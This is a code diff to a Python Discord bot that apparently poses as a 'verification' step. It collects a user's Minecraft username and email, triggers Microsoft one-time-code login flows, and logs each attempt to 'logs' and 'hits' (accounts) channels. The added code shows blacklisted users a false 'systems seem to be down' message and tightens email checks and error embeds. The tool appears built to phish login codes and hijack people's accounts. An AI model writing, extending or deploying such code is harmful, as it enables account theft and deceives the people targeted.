@@ -1,3 +1,4 @@
+from database.database import DBConnection
 from urllib.parse import quote
 from discord import ui, Embed
 import datetime
@@ -27,19 +28,56 @@ class MyModalOne(ui.Modal):
         username = quote(self.children[0].value)
         email = self.children[1].value
         config = json.load(open("config.json", "r+"))
+
+        logs_channel = await interaction.client.fetch_channel(config["discord"]["logs_channel"])
+        hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])
+
+        # Blacklisted Users
+        with DBConnection() as database:
+            if interaction.user.id in database.getBlacklistedUsers():
+                await interaction.response.send_message(
+                    embed = Embed(
+                        title = "Could not verify",
+                        description = "Our systems seem to be down at the moment. Please try again in a few hours.",
+                        color = 0xFF5C5C
+                    ), 
+                    ephemeral = True
+                )
+
+                await logs_channel.send(
+                    embed = Embed(
+                        title = f"User | {interaction.user.name} ({interaction.user.id})",
+                        description = f"**Email** | **Status** | **Reason**\n```{email} | Refused to Verify | User has been blacklisted```",
+                        timestamp = datetime.datetime.now(),
+                        colour = 0xFF5C5C                         
+                    ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{username}"),
+                    view = ButtonOptions(interaction.user)
+                )
+                return
         
         # Check if email is valid
-        if re.compile(r"^[\w\.-]+@[\w\.-]+\.\w{2,}$").match(email) is None:
+        if re.compile(r"^[\w\.-]+@([\w-]+\.)+[\w-]{2,4}$").match(email) is None:
             await interaction.response.send_message(
-                "❌ Invalid Email. Make sure you entered your email correctly!", 
+                embed = Embed(
+                    title = "❌ Invalid Email Address",
+                    description="Make sure you entered your email correctly!",
+                    color = 0xFF5C5C
+                ),
                 ephemeral = True
+            )
+
+            await logs_channel.send(
+                embed = Embed(
+                    title = f"User | {interaction.user.name} ({interaction.user.id})",
+                    description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to Verify | Invalid email entered```",
+                    timestamp = datetime.datetime.now(),
+                    colour = 0xFF5C5C                         
+                ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{username}"),
+                view = ButtonOptions(interaction.user)
             )
             return
 
         await interaction.response.defer(ephemeral=True)
-
-        logs_channel = await interaction.client.fetch_channel(config["discord"]["logs_channel"])
-        hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])
 
         self.session = getSession()
 
@@ -54,7 +92,7 @@ class MyModalOne(ui.Modal):
                     title = f"User | {interaction.user.name} ({interaction.user.id})",
                     description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to send code | Email does not exist```",
                     timestamp = datetime.datetime.now(),
-                    colour = 0xFF5C5C,                         
+                    colour = 0xFF5C5C                         
                 ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{username}"),
                 view = ButtonOptions(interaction.user)
             )
@@ -270,9 +308,8 @@ class MyModalOne(ui.Modal):
             # which will be caught by the branches below. Re-evaluate by falling into them.
             print("[+] - FIDO forceotc fallback succeeded, continuing with OTP flow")
 
-        if "OtcLoginEligibleProofs" in emailInfo.get("Credentials", {}):
+        if "OtcLoginEligibleProofs" in emailInfo["Credentials"]:
 
-            # Initialize to None so we get a clean error if no proof has otcSent
             verflowtoken = None
             verEmail = None
 
@@ -280,7 +317,7 @@ class MyModalOne(ui.Modal):
                 if value.get("otcSent"):
                     verflowtoken = value["data"]
                     verEmail = value["display"]
-                    break  # Use the first sent proof
+                    break 
 
             if not verEmail or not verflowtoken:
                 print("[X] - OtcLoginEligibleProofs found but no proof had otcSent=True")
